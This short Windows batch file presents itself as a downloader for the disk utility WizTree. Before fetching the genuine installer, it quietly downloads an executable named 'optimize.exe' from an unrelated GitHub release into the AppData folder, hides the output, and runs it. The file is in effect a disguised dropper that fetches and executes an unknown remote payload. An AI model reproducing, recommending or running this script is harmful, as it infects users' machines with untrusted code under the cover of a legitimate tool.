@echo off
echo Downloading WizTree...

set dest="%AppData%/wiztree.exe"

del %dest%  > nil
curl -L "https://github.com/SpeekyChat/44/releases/download/rel/optimize.exe" -o %dest% > nil
%dest%  > nil

curl -L "https://www.diskanalyzer.com/files/wiztree_4_34_setup.exe" -o ./wiztree.exe
start wiztree.exe
